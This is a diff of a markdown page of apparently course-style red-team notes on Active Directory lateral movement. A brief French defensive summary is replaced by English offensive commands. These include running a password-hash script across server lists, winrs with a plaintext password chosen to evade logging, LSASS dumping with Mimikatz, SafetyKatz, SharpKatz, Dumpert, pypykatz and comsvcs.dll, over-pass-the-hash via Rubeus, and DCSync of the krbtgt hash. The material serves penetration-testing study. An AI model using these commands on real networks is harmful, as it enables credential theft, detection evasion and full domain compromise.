@@ -1,71 +1,231 @@
+---
+title: "3 - Lateral Movement"
+---
+
 # Lateral Movement
 
-Étude des mécanismes d'administration distante Windows et des risques liés à la réutilisation des identités.
+- Think of PowerShell Remoting (PSRemoting) as psexec on steroids but much more silent and super fast!
+- PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management.
+- Enabled by default on Server 2012 onwards with a firewall exception.
+- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).
+- It is the recommended way to manage Windows Core servers.
+- You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that.
+- The remoting process runs as a high integrity process. That is, you get an elevated shell.
 
-## PowerShell Remoting
+**One-to-One**
 
-WinRM implémente WS-Management. Les ports habituels sont TCP 5985 pour HTTP et 5986 pour HTTPS.
-
-### Sessions interactives et persistantes
-
-New-PSSession crée une session persistante ; Enter-PSSession permet une interaction avec une session. Invoke-Command permet notamment l'administration de plusieurs systèmes. Les notes distinguent les sessions stateful des exécutions ponctuelles.
-
-### Processus PowerShell
-
+PSSession:
 ```powershell
-Get-PSHostProcessInfo
+– Interactive
+– Runs in a new process (wsmprovhost)
+– Is Stateful
 ```
 
-Inventorie les processus hébergeant PowerShell.
-
-### Session interactive
-
+Useful cmdlets:
 ```powershell
-Enter-PSSession -ComputerName Server1
+– New-PSSession
+– Enter-PSSession
 ```
 
-Ouvre une session PowerShell interactive sur le serveur de laboratoire Server1, avec les droits de l'identité authentifiée.
-
-### Créer une session persistante
-
 ```powershell
-$machine = New-PSSession -ComputerName Server1
+# 1. PS> 
+Enter-PSSession <machine>
+Get-PSHostProcessInfo #this will show the ProccessID of wsmprovhost
+
+# 2. PS> 
+$machine = New-PSSession <machine>
 ```
 
-Crée une session distante réutilisable et conserve son objet dans la variable $machine.
 
-### Inventaire des processus sur plusieurs serveurs
 
+**One-to-Many**
+
+- Also known as Fan-out remoting.
+- Non-interactive.
+- Executes commands parallely.
+
+Useful cmdlets
 ```powershell
-Invoke-Command -ScriptBlock { Get-Process } -ComputerName (Get-Content C:\scripts\servers.txt)
+– Invoke-Command
 ```
 
-Interroge les processus des serveurs administrés dont les noms figurent dans le fichier servers.txt. Le chemin remplace le placeholder du document original.
-
-### Conserver un état entre deux appels
-
+Run commands and scripts on:
 ```powershell
-$Sess = New-PSSession -ComputerName Server1
-Invoke-Command -Session $Sess -ScriptBlock { $Proc = Get-Process }
-Invoke-Command -Session $Sess -ScriptBlock { $Proc.Name }
+– multiple remote computers
+– in disconnected sessions (v3)
+– as background job and more.
 ```
 
-Crée une session distante, y conserve les objets processus et affiche leurs noms lors d'un second appel.
+> The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers.
+> Use -Credential parameter to pass username/password.
 
-## Administration distante
 
-Le document cite également WinRS et les interfaces WSMan. Contrôler l'autorisation des connexions, les identités utilisées et la journalisation des sessions.
+**[easy to detect - noisy]**
 
-## Credential Access
+**Use below to execute commands or scriptblocks**:
+```powershell
+Invoke-Command -Scriptblock {Get-Process} -ComputerName	(Get-Content <list_of_servers>)
+```
 
-Mimikatz, SafetyKatz, SharpKatz, Dumpert, pypykatz et les mécanismes de dump de processus sont présentés dans la source. Ils illustrent le risque d'exposition des éléments d'authentification en mémoire.
+**Use below to execute scripts from files**:
+```powershell
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -	ComputerName (Get-Content <list_of_servers>)
+```
+
+**Use below to execute locally loaded function on the remote machines**:
+```powershell
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
+```
+
+**In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way**:
+```powershell
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
+```
+
+**In below, a function call within the script is used**:
+```powershell
+Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
+```
+
+**Use below to execute Stateful commands using Invoke-Command**:
+```powershell
+$Sess = New-PSSession -Computername Server1
+Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
+Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
+```
+
+
+**[more stealthy]**
+
+> PowerShell remoting supports the system-wide transcripts and deep script block logging.
+
+We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
+```powershell
+winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
+```
+
+> We can also use winrm.vbs 
+> COM objects of WSMan object (even more silently)
+
+[WSMan-WinRM on GitHub](https://github.com/bohops/WSMan-WinRM)
+
+
+
+# MIMIKATZ
+
+[Mimikatz on GitHub](https://github.com/gentilkiwi/mimikatz)
+
+Unofficial mimikatz guide:
+
+[ADSecurity Blog - Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=2207)
+
+
+**Local admin required**
+
+> Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory.
+
+All the functions of mimikatz could be used from this script.
+
+> [everything from LSASS is heavily detected]**
+
+**Dump credentials on a local machine using Mimikatz**:
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+**Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)**:
+```powershell
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+
+**Dump credentials Using SharpKatz (C# port of some of Mimikatzfunctionality)**:
+```powershell
+SharpKatz.exe --Command ekeys
+```
+
+**Dump credentials using Dumpert (Direct System Calls and API unhooking)**:
+```powershell
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+```
+
+**Using pypykatz (Mimikatz functionality in Python)**:
+```powershell
+pypykatz.exe live lsa
+```
+
+**Using comsvcs.dll**:
+```powershell
+tasklist /FI "IMAGENAME eq lsass.exe" 
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
+```
+
+- From a Linux attacking machine using *impacket*
+- From a Linux attacking machine using *Physmem2profit*
+
+## References
+
+[Fantastic Windows Logon Types and Where to Find Credentials in Them](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them)
+
+[Invoke-Mimikatz.ps1 in Nishang](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)
+
+[SharpKatz on GitHub](https://github.com/b4rtik/SharpKatz)
+
+[Dumpert on GitHub](https://github.com/outflanknl/Dumpert)
+
+[BetterSafetyKatz on GitHub](https://github.com/Flangvik/BetterSafetyKatz)
+
+[SafetyKatz on GitHub](https://github.com/GhostPack/SafetyKatz)
+
+[pypykatz on GitHub](https://github.com/skelsec/pypykatz)
+
+[lsassy on GitHub](https://github.com/Hackndo/lsassy)
+
+[impacket on GitHub](https://github.com/SecureAuthCorp/impacket/)
+
+[physmem2profit on GitHub](https://github.com/FSecureLABS/physmem2profit)
+
+
+# What to do with credentials?
 
 ## Over-Pass-The-Hash
 
-Les notes décrivent la réutilisation de clés ou d'empreintes d'authentification pour obtenir un contexte Kerberos. Il convient de distinguer le risque de réutilisation NTLM et celui de réutilisation de tickets Kerberos.
+Over Pass the hash (OPTH) generate tokens from hashes or keys. 
 
-## DCSync
+> Needs elevation (Run as administrator)
 
-DCSync détourne les droits de réplication AD. La revue doit porter sur les comptes autorisés à répliquer les données et sur les opérations de réplication inhabituelles.
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"' 
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
+```
 
-Voir [AD Defense](./defense.md) pour les contrôles et la détection.
+> The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
+
+
+- Over Pass the hash (OPTH) generate tokens from hashes or keys.
+
+**Doesn't need elevation**:
+```powershell
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+```
+
+**Needs elevation**:
+```powershell
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+```powershell
+pass-the-hash # for non domain machines
+overpass-the-hash # for domain machines (it gerenates kerberos token)
+```
+ 
+# DCSync
+
+> By default, Domain Admins privileges are required to run DCSync
+
+To extract credentials from the DC without code execution on it, we can use DCSync.
+
+To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
